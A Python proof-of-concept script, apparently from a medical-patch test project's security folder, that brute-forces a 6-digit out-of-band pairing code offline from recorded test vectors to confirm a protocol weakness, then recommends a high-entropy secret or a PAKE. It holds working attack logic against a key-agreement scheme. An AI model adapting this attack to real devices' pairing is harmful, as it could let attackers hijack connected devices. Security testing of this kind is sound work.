#!/usr/bin/env python3
"""FINDING-002 demonstrator: a LOW-ENTROPY out-of-band (OOB) code is recovered offline from ONE pairing attempt.

TEST PROJECT, not a medical device. This script attacks only recorded test vectors (docs/vectors/session-key-agreement.json),
it contains no radio code.

Why it works (docs/04-protocol.md 4.1, 4.3): the OOB code only enters the HKDF *salt*, and the pod's INIT response carries
confirm_pod = HMAC(confirm_key, label || th) where confirm_key depends on (dh, salt, th). An active attacker that merely
completes ONE PAIR_INIT with the pod (while the 60 s window is open) knows dh (its own ephemeral secret x and the pod's public
key), th (all public values) and confirm_pod, so every candidate code can be tested offline: derive confirm_key, compare tag.
For a 6 digit code this takes seconds. The attacker then pairs as the legitimate phone, or relays between phone and pod.

Usage: python3 -I security/poc/oob_offline_guess.py [path/to/session-key-agreement.json]
Exit code 0 = the attack reproduced (finding confirmed), 1 = the code was NOT recovered (finding closed / schedule changed).
Needs only the Python standard library.
"""
import hashlib
import hmac
import json
import os
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT = os.path.join(HERE, "..", "..", "docs", "vectors", "session-key-agreement.json")
h = bytes.fromhex


def hmac_sha256(key: bytes, msg: bytes) -> bytes:
    return hmac.new(key, msg, hashlib.sha256).digest()


def hkdf_extract(salt: bytes, ikm: bytes) -> bytes:
    return hmac_sha256(salt, ikm)


def hkdf_expand(prk: bytes, info: bytes, length: int) -> bytes:
    out, t, i = b"", b"", 1
    while len(out) < length:
        t = hmac_sha256(prk, t + info + bytes([i]))
        out += t
        i += 1
    return out[:length]


def confirm_key_for(dh: bytes, oob: bytes, th: bytes) -> bytes:
    """docs/04-protocol.md 4.1: salt = SHA-256("OPENPATCH/1 oob" || oob); okm = Expand(Extract(salt, dh), "OPENPATCH/1 pairing" || th, 64)."""
    salt = hashlib.sha256(b"OPENPATCH/1 oob" + oob).digest() if oob else bytes(32)
    okm = hkdf_expand(hkdf_extract(salt, dh), b"OPENPATCH/1 pairing" + th, 64)
    return okm[32:64]


def confirm_pod(confirm_key: bytes, th: bytes) -> bytes:
    return hmac_sha256(confirm_key, b"OPENPATCH/1 confirm pod" + th)[:16]


def main() -> int:
    path = sys.argv[1] if len(sys.argv) > 1 else DEFAULT
    vec = json.load(open(path))
    run = next(p for p in vec["pairing"] if p["oob"])  # the run that used the OOB code
    dh, th, observed = h(run["dh"]), h(run["transcript_hash"]), h(run["confirm_pod"])

    # 1. Self-check: the key schedule re-implemented here reproduces the vector (so the attack targets the real scheme).
    real = bytes.fromhex(run["oob"])
    assert confirm_pod(confirm_key_for(dh, real, th), th) == observed, "key schedule does not match the vector"
    print("key schedule reproduces the vector (confirm_pod matches for the true code)")

    # 2. What the attacker holds: dh (own ephemeral secret + pod public), th (public), confirm_pod (on the air).
    #    It does NOT use run["oob"] below.
    digits = len(real.decode())
    t0 = time.time()
    found = None
    for n in range(10 ** digits):
        guess = str(n).zfill(digits).encode()
        if confirm_pod(confirm_key_for(dh, guess, th), th) == observed:
            found = guess
            break
    dt = time.time() - t0
    if found is None:
        print("code NOT recovered: the finding no longer reproduces")
        return 1
    print("RECOVERED out-of-band code %s after %d guesses in %.1f s (single Python thread, %.0f guesses/s)" % (
        found.decode(), int(found) + 1, dt, (int(found) + 1) / max(dt, 1e-9)))
    print("-> a %d digit OOB code gives NO protection against an attacker who completes one PAIR_INIT." % digits)
    print("   Needed: a high-entropy OOB secret (>= 128 bit, QR) or a PAKE (CPace / SPAKE2+); see security/proposals/02-authenticated-pairing.md")
    return 0


if __name__ == "__main__":
    sys.exit(main())
